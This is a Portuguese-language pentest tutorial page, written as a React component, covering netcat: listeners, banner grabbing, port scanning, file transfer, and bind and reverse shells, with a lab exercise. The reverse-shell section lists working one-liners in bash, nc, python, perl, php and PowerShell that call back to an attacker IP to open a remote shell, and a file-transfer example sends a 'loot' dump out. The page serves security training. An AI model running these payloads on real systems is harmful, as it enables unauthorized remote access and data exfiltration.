import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Netcat() {
  return (
    <PageContainer
      title="Netcat — o canivete TCP/IP"
      subtitle="Listener, banner grabbing, transferência de arquivos, port scan e reverse shells."
      difficulty="iniciante"
      timeToRead="14 min"
      prompt="recon/netcat"
    >
      <h2>Versões</h2>
      <p>
        Existem 3 implementações comuns. Saiba qual você está usando — flags mudam.
      </p>
      <CommandTable
        title="Variantes do nc"
        variations={[
          { cmd: "nc.openbsd", desc: "Padrão atual no Kali/Debian. NÃO tem -e (sem RCE direto).", output: "/usr/bin/nc → /etc/alternatives → nc.openbsd" },
          { cmd: "nc.traditional", desc: "Tem -e (executa programa). Reverse shell clássica.", output: "sudo apt install netcat-traditional" },
          { cmd: "ncat", desc: "Da família Nmap. Suporta SSL, lista de permissões, brokering.", output: "ncat --ssl -lvnp 4444" },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "which nc && nc -h 2>&1 | head -3",
            out: `/usr/bin/nc
OpenBSD netcat (Debian patchlevel 1.226-1)
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
          [-m minttl] [-O length] [-P proxy_username] [-p source_port]`,
            outType: "info",
          },
          {
            cmd: "ls -la /etc/alternatives/nc",
            out: "lrwxrwxrwx 1 root root 18 Mar 12 14:02 /etc/alternatives/nc -> /bin/nc.openbsd",
            outType: "default",
          },
          {
            comment: "alternar para nc tradicional (com -e)",
            cmd: "sudo update-alternatives --config nc",
            out: `There are 2 choices for the alternative nc (providing /usr/bin/nc).

  Selection    Path                 Priority   Status
------------------------------------------------------------
* 0            /bin/nc.openbsd       50        auto mode
  1            /bin/nc.openbsd       50        manual mode
  2            /bin/nc.traditional   10        manual mode

Press <enter> to keep the current choice[*], or type selection number:`,
            outType: "warning",
          },
        ]}
      />

      <h2>Listener simples (chat TCP)</h2>
      <Terminal
        user="wallyson"
        host="kali"
        path="~"
        lines={[
          {
            comment: "TERMINAL 1 (escuta na porta 9999)",
            cmd: "nc -lvnp 9999",
            out: `Listening on 0.0.0.0 9999
Connection received on 192.168.1.108 51234
oi servidor`,
            outType: "success",
          },
        ]}
      />
      <Terminal
        user="wallyson"
        host="cliente"
        path="~"
        lines={[
          {
            comment: "TERMINAL 2 (em outra máquina ou localhost)",
            cmd: "nc 192.168.1.42 9999",
            out: "(silencioso. digite e ENTER → aparece no listener)",
            outType: "info",
          },
        ]}
      />

      <h2>Banner grabbing</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "nc -nv 192.168.1.50 22",
            out: `(UNKNOWN) [192.168.1.50] 22 (ssh) open
SSH-2.0-OpenSSH_9.6p1 Ubuntu-3`,
            outType: "info",
          },
          {
            cmd: "nc -nv 192.168.1.50 80",
            out: `(UNKNOWN) [192.168.1.50] 80 (http) open`,
            outType: "default",
          },
          {
            comment: "agora digite manualmente o request HTTP",
            cmd: "GET / HTTP/1.1",
            out: "(linha em branco depois)",
            outType: "muted",
          },
          {
            cmd: "Host: 192.168.1.50",
            out: `HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Fri, 03 Apr 2026 11:23:14 GMT
Content-Type: text/html
Content-Length: 612

<!DOCTYPE html>
<html>
<head><title>Welcome to nginx!</title></head>
[...]`,
            outType: "success",
          },
        ]}
      />

      <h2>Port scan rápido (com -z)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "nc -zv 192.168.1.50 20-25",
            out: `nc: connect to 192.168.1.50 port 20 (tcp) failed: Connection refused
nc: connect to 192.168.1.50 port 21 (tcp) failed: Connection refused
Connection to 192.168.1.50 22 port [tcp/ssh] succeeded!
nc: connect to 192.168.1.50 port 23 (tcp) failed: Connection refused
nc: connect to 192.168.1.50 port 24 (tcp) failed: Connection refused
nc: connect to 192.168.1.50 port 25 (tcp) failed: Connection refused`,
            outType: "info",
          },
          {
            comment: "scan UDP (-u)",
            cmd: "nc -zuv 192.168.1.50 53 161 123",
            out: `Connection to 192.168.1.50 53 port [udp/domain] succeeded!
Connection to 192.168.1.50 123 port [udp/ntp] succeeded!`,
            outType: "default",
          },
        ]}
      />

      <h2>Transferir arquivos</h2>
      <Terminal
        user="wallyson"
        host="kali"
        path="~"
        lines={[
          {
            comment: "RECEPTOR (vai gerar o arquivo loot.zip)",
            cmd: "nc -lvnp 4444 > loot.zip",
            out: `Listening on 0.0.0.0 4444
Connection received on 192.168.1.108 51445`,
            outType: "info",
          },
        ]}
      />
      <Terminal
        user="wallyson"
        host="alvo"
        path="~"
        lines={[
          {
            comment: "EMISSOR (manda o arquivo)",
            cmd: "nc -w 3 192.168.1.42 4444 < /tmp/dump.zip",
            out: "(aguarda 3s após enviar e fecha)",
            outType: "success",
          },
        ]}
      />
      <Terminal
        path="~"
        lines={[
          {
            comment: "validar integridade",
            cmd: "sha256sum /tmp/dump.zip loot.zip",
            out: `e8a7b2c4d3...  /tmp/dump.zip
e8a7b2c4d3...  loot.zip`,
            outType: "success",
          },
        ]}
      />

      <h2>Reverse shells (laboratório)</h2>
      <p>
        O caso clássico: você tem RCE no alvo mas ele não tem porta inbound aberta.
        Ele <strong>conecta de volta</strong> para você.
      </p>

      <Terminal
        user="wallyson"
        host="kali"
        path="~"
        lines={[
          {
            comment: "ATACANTE: abre listener",
            cmd: "nc -lvnp 4444",
            out: `Listening on 0.0.0.0 4444
Connection received on 10.10.10.5 51234`,
            outType: "success",
          },
        ]}
      />

      <CodeBlock
        language="bash"
        title="payloads de reverse shell — rode no ALVO (RCE)"
        code={`# bash (mais comum em CTFs)
bash -i >& /dev/tcp/192.168.1.42/4444 0>&1

# nc tradicional (com -e) — direto
nc -e /bin/bash 192.168.1.42 4444

# nc openbsd (sem -e) — usando named pipe
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.42 4444 > /tmp/f

# python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.42",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# perl
perl -e 'use Socket;$i="192.168.1.42";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# php
php -r '$sock=fsockopen("192.168.1.42",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# powershell (Windows)
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.42",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close()`}
      />

      <h3>Estabilizar a TTY</h3>
      <Terminal
        path="~"
        lines={[
          {
            comment: "shell crua chega assim — sem tab, sem setas, mata com Ctrl+C",
            cmd: "(reverse shell aberta) → www-data@target:/$ ",
            out: "",
            outType: "muted",
          },
          {
            comment: "1) upgrade pra PTY",
            cmd: 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
            out: "www-data@target:/$ ",
            outType: "info",
          },
          {
            comment: "2) liberar Ctrl+C, setas e tab — Ctrl+Z para suspender",
            cmd: "stty raw -echo; fg",
            out: "(volta pro shell remoto agora navegável)",
            outType: "default",
          },
          {
            comment: "3) reset de tipo de terminal",
            cmd: "export TERM=xterm-256color",
            out: "",
            outType: "muted",
          },
          {
            cmd: "stty rows 40 cols 130",
            out: "(ajusta tamanho — tire do seu xterm com 'stty size')",
            outType: "muted",
          },
        ]}
      />

      <h2>Bind shell (porta no alvo)</h2>
      <Terminal
        user="wallyson"
        host="alvo"
        path="~"
        lines={[
          {
            comment: "ALVO (com nc tradicional): abre porta 9001",
            cmd: "nc -lvnp 9001 -e /bin/bash",
            out: "Listening on 0.0.0.0 9001",
            outType: "warning",
          },
        ]}
      />
      <Terminal
        user="wallyson"
        host="kali"
        path="~"
        lines={[
          {
            comment: "ATACANTE: conecta",
            cmd: "nc 10.10.10.5 9001",
            out: `id
uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
            outType: "info",
          },
        ]}
      />

      <h2>ncat com SSL e ACL</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "listener TLS (ncat gera cert self-signed automaticamente)",
            cmd: "ncat --ssl -lvnp 4444 --allow 192.168.1.0/24",
            out: `Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 8C0F 7A1B 3D9C E2F4 ...
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.1.108.`,
            outType: "success",
          },
        ]}
      />

      <PracticeBox
        title="Reverse shell estabilizada — laboratório"
        goal="Simular o cenário de RCE: ALVO conecta de volta, atacante recebe shell, estabiliza, vira root simulado."
        steps={[
          "Em uma janela, abra um listener nc na porta 4444.",
          "Em outra janela (simulando o alvo), dispare a reverse shell em bash.",
          "No listener: estabilize com python3 pty + stty raw -echo.",
          "Confirme `id` e `whoami` da conexão.",
        ]}
        command={`# JANELA 1 — ATACANTE
nc -lvnp 4444

# JANELA 2 — "ALVO" (no mesmo Kali, simulando)
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# DENTRO DA SHELL RECEBIDA NO ATACANTE:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
id`}
        expected={`Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 51234
wallyson@kali:~$ id
uid=1000(wallyson) gid=1000(wallyson) groups=1000(wallyson),27(sudo)`}
        verify="A shell deve aceitar TAB completion, setas (histórico), Ctrl+C sem matar a sessão."
      />

      <AlertBox type="warning" title="O nc do Kali não tem -e">
        A versão padrão do Kali é <code>nc.openbsd</code> — sem <code>-e</code>.
        Use o <em>fifo trick</em>, <code>ncat -e</code> ou linguagens (bash, python, php).
        No Windows, prefira <code>powershell</code> ou <code>ncat.exe</code>.
      </AlertBox>
    </PageContainer>
  );
}
